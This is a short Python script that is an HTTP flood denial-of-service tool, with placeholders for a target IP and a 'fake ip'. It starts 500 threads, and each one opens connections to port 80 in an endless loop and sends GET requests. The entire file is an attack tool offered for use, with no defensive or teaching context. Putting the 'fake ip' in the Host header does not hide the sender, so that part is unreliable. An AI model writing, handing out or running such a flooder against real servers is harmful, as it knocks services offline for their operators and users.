import threading
import socket


def attack():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        s.sendto(
            ("GET /" + target + " HTTP/1.1\r\n").encode('ascii'),
            (target, port)
        )
        s.sendto(
            ("HOST: " + fake_ip + "\r\n\r\n").encode('ascii'),
            (target, port)
        )
        s.close()


if __name__ == "__main__":
    target = 'your target ip'
    port = 80
    fake_ip = 'your fake ip'
    attack_time = 500

    for i in range(attack_time):
        thread = threading.Thread(target=attack)
        thread.start()
